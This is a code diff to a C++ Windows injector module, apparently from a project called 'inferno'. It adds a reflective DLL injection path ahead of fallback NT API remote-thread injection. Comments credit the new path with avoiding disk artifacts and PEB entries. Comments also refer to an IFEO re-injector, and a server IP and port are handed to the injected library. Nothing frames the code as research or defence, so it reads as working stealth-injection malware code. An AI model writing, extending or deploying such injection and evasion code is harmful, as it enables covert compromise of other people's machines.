@@ -9,12 +9,14 @@
 #include "../include/WindowsInjector.hpp"
 #ifdef _WIN32
 #include "../include/NtApi.hpp"
+#include "../include/ReflectiveLoader.hpp"
 #endif
 #include <cstdio>
 #include <cstdlib>
 #include <cstring>
 #include <string>
 #include <vector>
+#include <fstream>
 
 namespace inferno { namespace tier2 {
 
@@ -65,6 +67,19 @@ bool injectIntoTarget(DWORD, const std::string&,
 }
 
 #elif defined(_WIN32)
+
+static std::vector<uint8_t> readBinaryFile(const std::string& path) {
+    std::ifstream file(path, std::ios::binary | std::ios::ate);
+    if (!file) return {};
+    std::streamsize size = file.tellg();
+    if (size <= 0) return {};
+    file.seekg(0, std::ios::beg);
+    std::vector<uint8_t> buffer(static_cast<size_t>(size));
+    if (!file.read(reinterpret_cast<char*>(buffer.data()), size)) {
+        return {};
+    }
+    return buffer;
+}
 
 DWORD findProcessPid(const std::string& exec_path) {
     HANDLE snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -211,13 +226,32 @@ static bool injectViaRemoteThread(DWORD pid, const std::string& dll_path,
     return ok;
 }
 
-// PID-based injection (no fallback chain, no execution-only attempt).
-// Used by the IFEO re-injector where we know the PID from CreateProcess.
+// PID-based injection (used by the IFEO re-injector).
+// Tries reflective loader first, falls back to standard NT API injection.
 bool injectIntoTarget(DWORD pid,
                       const std::string& dll_path,
                       const std::string& server_ip,
                       uint16_t server_port) {
-    (void)server_ip; (void)server_port;
+    // Tier 1: Try reflective DLL loader
+    std::vector<uint8_t> dll_bytes = readBinaryFile(dll_path);
+    if (!dll_bytes.empty()) {
+        HANDLE hProcess = nullptr;
+        if (openTargetProcess(pid, hProcess)) {
+            bool ok = nt::injectReflective(hProcess, dll_bytes,
+                                            server_ip, server_port);
+            {
+                auto& nt = inferno::nt::NtApi::resolve();
+                nt.NtClose(hProcess);
+            }
+            if (ok) {
+                std::fprintf(stdout,
+                    "[WindowsInjector] Reflective injection succeeded (PID)\n");
+                return true;
+            }
+        }
+    }
+
+    // Tier 2: Standard NT API injection (LoadLibraryA via NtCreateThreadEx)
     HANDLE hProcess = nullptr;
     if (!openTargetProcess(pid, hProcess)) return false;
 
@@ -350,7 +384,27 @@ bool injectIntoTarget(const TargetApp& target,
     switch (target.capability) {
         case InjectionCapability::DYLD_INSERT_LIBRARIES:
         case InjectionCapability::MACH_VM_ALLOCATE:
-            // Try execution-only first (no VirtualAllocEx/WriteProcessMemory).
+            // Tier 1: Try reflective DLL loader first (no disk artifact, no PEB entry).
+            {
+                std::vector<uint8_t> dll_bytes = readBinaryFile(dll_path);
+                if (!dll_bytes.empty()) {
+                    HANDLE hProcess = nullptr;
+                    if (openTargetProcess(pid, hProcess)) {
+                        bool ok = nt::injectReflective(
+                            hProcess, dll_bytes, server_ip, server_port);
+                        {
+                            auto& nt_cleanup = inferno::nt::NtApi::resolve();
+                            nt_cleanup.NtClose(hProcess);
+                        }
+                        if (ok) {
+                            std::fprintf(stdout,
+                                "[WindowsInjector] Reflective injection succeeded\n");
+                            return true;
+                        }
+                    }
+                }
+            }
+            // Tier 2: Try execution-only (no VirtualAllocEx/WriteProcessMemory).
             // Falls back to standard NT API injection if the string isn't found
             // or target verification fails.
             if (injectExecutionOnly(pid, dll_path, server_ip, server_port)) {
